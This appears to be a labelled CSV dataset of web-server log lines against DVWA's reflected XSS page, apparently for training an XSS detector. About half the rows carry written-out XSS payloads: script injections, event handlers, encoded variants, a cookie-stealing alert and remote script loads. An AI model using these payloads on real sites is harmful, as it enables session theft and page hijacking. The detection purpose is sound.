,url,malicious
15466,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%253cscript%253ealert(1)%253c/script%253e HTTP/1.1"" 200 1712 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
6438,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track draggable=\""true\"""" 400 0 ""-"" ""-""",1
17535,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<h1 onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
16060,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dd onblur=alert(1)"" 400 0 ""-"" ""-""",1
9432,"127.0.0.1 - - [03/May/2021:03:13:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cristian HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14694,"127.0.0.1 - - [03/May/2021:03:24:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Phuong HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9342,"127.0.0.1 - - [03/May/2021:03:07:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=nucleo HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7753,"127.0.0.1 - - [03/May/2021:03:24:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ria HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16408,"127.0.0.1 - - [03/May/2021:03:40:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=navigator.vibrate(500) HTTP/1.1"" 200 1712 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
1210,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<option onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
5494,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noembed draggable=\""true\"""" 400 0 ""-"" ""-""",1
18299,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=javascript:alert('XSS')>"" 400 0 ""-"" ""-""",1
7199,"127.0.0.1 - - [03/May/2021:03:12:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Calida HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13,"127.0.0.1 - - [03/May/2021:03:20:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leyton HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12878,"127.0.0.1 - - [03/May/2021:02:35:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<;DIV STYLE=\"";background-image:\\0075\\0072\\006C\\0028';\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.10530053\\0027\\0029';\\0029\"";>;"" 400 0 ""-"" ""-""",1
2387,"127.0.0.1 - - [03/May/2021:03:14:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Debbi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10824,"127.0.0.1 - - [03/May/2021:02:34:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>"" 400 0 ""-"" ""-""",1
2657,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<aside oncontextmenu=\""alert(1)\"">test</aside>"" 400 0 ""-"" ""-""",1
1939,"127.0.0.1 - - [03/May/2021:02:23:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%22onmouseover%3dalert(1)%2f%2f HTTP/1.1"" 200 1673 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
12301,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed code=\""http://businessinfo.co.uk/labs/xss/xss.swf\"""" 400 0 ""-"" ""-""",1
3948,"127.0.0.1 - - [03/May/2021:03:05:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=adrian HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6394,"127.0.0.1 - - [03/May/2021:03:26:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sohayla HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8792,"127.0.0.1 - - [03/May/2021:03:21:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marthe HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18180,"127.0.0.1 - - [03/May/2021:03:19:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Khamdy HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9816,"127.0.0.1 - - [03/May/2021:03:06:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=foo HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15808,"127.0.0.1 - - [03/May/2021:03:26:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shelley HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4341,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><big onload=alert(1)></big>"" 400 0 ""-"" ""-""",1
15750,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sup onmouseover=\""alert(1)\"">test</sup>"" 400 0 ""-"" ""-""",1
2416,"127.0.0.1 - - [03/May/2021:03:19:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Junie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5112,"127.0.0.1 - - [03/May/2021:03:14:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Danita HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8301,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a onmouseover=alert(document.cookie)>xxs"" 400 0 ""-"" ""-""",1
17721,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Famke HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14637,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<isindex id=x"" 400 0 ""-"" ""-""",1
16135,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<?a foo=x=`y><img"" 400 0 ""-"" ""-""",1
4772,"127.0.0.1 - - [03/May/2021:03:06:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=fotos HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17033,"127.0.0.1 - - [03/May/2021:03:07:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=nyquist HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18578,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dd ondblclick=\""alert(1)\"">test</dd>"" 400 0 ""-"" ""-""",1
17260,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src"" 400 0 ""-"" ""-""",1
3169,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Patti HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9222,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""><img src=x"" 400 0 ""-"" ""-""",1
54,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sup onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6950,"127.0.0.1 - - [03/May/2021:03:20:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Laurella HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2131,"127.0.0.1 - - [03/May/2021:03:05:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=brandi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10788,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rb oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
4697,"127.0.0.1 - - [03/May/2021:03:20:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lillian HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10466,"127.0.0.1 - - [03/May/2021:03:20:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lela HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13190,"127.0.0.1 - - [03/May/2021:03:10:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Agace HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5103,"127.0.0.1 - - [03/May/2021:03:22:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Monty HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
312,"127.0.0.1 - - [03/May/2021:03:07:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=restricted HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4842,"127.0.0.1 - - [03/May/2021:03:10:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Amour HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16980,"127.0.0.1 - - [03/May/2021:03:12:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bnrecad HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18238,"127.0.0.1 - - [03/May/2021:03:05:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=anita HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10578,"127.0.0.1 - - [03/May/2021:03:25:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rolf HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16278,"127.0.0.1 - - [03/May/2021:03:11:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bettye HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16638,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body/onload=&lt;!--&gt;&#10alert(1)> HTTP/1.1"" 400 0 ""-"" ""-""",1
7938,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meter onmouseup=\""alert(1)\"">test</meter>"" 400 0 ""-"" ""-""",1
10658,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\x0Ajavascript:alert(1)</script> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
18884,"127.0.0.1 - - [03/May/2021:03:22:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nadean HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12693,"127.0.0.1 - - [03/May/2021:03:17:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Henny HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13353,"127.0.0.1 - - [03/May/2021:03:06:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=diane HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4457,"127.0.0.1 - - [03/May/2021:03:40:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<figcaption onmousemove=\""alert(1)\"">test</figcaption>"" 400 0 ""-"" ""-""",1
1410,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
4308,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nydia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12829,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<del onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
14163,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rozanne HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2746,"127.0.0.1 - - [03/May/2021:03:25:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sandro HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11259,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&#34;&#62;<h1/onmouseover='\\u0061lert(1)'>%00 HTTP/1.1"" 400 0 ""-"" ""-""",1
5925,"127.0.0.1 - - [03/May/2021:03:40:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
16053,"127.0.0.1 - - [03/May/2021:03:05:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=badass HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
157,"127.0.0.1 - - [03/May/2021:03:23:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Padriac HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14060,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javas\\x09cript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
6737,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body oncontextmenu=\""alert(1)\"">test</body>"" 400 0 ""-"" ""-""",1
5775,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<strong onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
11775,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>%(payload)s//<</SCRIPT> HTTP/1.1"" 200 1715 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
16697,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<main oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
3041,"127.0.0.1 - - [03/May/2021:03:27:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tybi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12033,"127.0.0.1 - - [03/May/2021:03:25:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Selina HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8226,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=src=\""http://www.site.com/XSS.js\""></script> HTTP/1.1"" 200 1709 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8822,"127.0.0.1 - - [03/May/2021:03:14:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=De-Anna HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5576,"127.0.0.1 - - [03/May/2021:03:10:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adore HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2615,"127.0.0.1 - - [03/May/2021:03:26:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Suvanee HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8063,"127.0.0.1 - - [03/May/2021:03:04:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pages HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11914,"127.0.0.1 - - [03/May/2021:03:07:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=nuclear HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8078,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
300,"127.0.0.1 - - [03/May/2021:03:23:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Olwen HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1774,"127.0.0.1 - - [03/May/2021:03:17:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Henryetta HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10400,"127.0.0.1 - - [03/May/2021:03:10:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ahmed HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12557,"127.0.0.1 - - [03/May/2021:03:08:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=tomato HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10371,"127.0.0.1 - - [03/May/2021:02:24:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20%6Fnxxx%3d1%20 HTTP/1.1"" 200 1667 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
12952,"127.0.0.1 - - [03/May/2021:03:13:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Concordia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16620,"127.0.0.1 - - [03/May/2021:03:24:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ramaprakash HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6997,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<main draggable=\""true\"""" 400 0 ""-"" ""-""",1
8030,"127.0.0.1 - - [03/May/2021:03:07:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=passw HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7961,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<p onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
4543,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rt id=x"" 400 0 ""-"" ""-""",1
6108,"127.0.0.1 - - [03/May/2021:03:12:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Charisse HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8919,"127.0.0.1 - - [03/May/2021:03:07:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=mitjans HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8859,"127.0.0.1 - - [03/May/2021:03:05:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=batman HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2095,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onkeydown"" 400 0 ""-"" ""-""",1
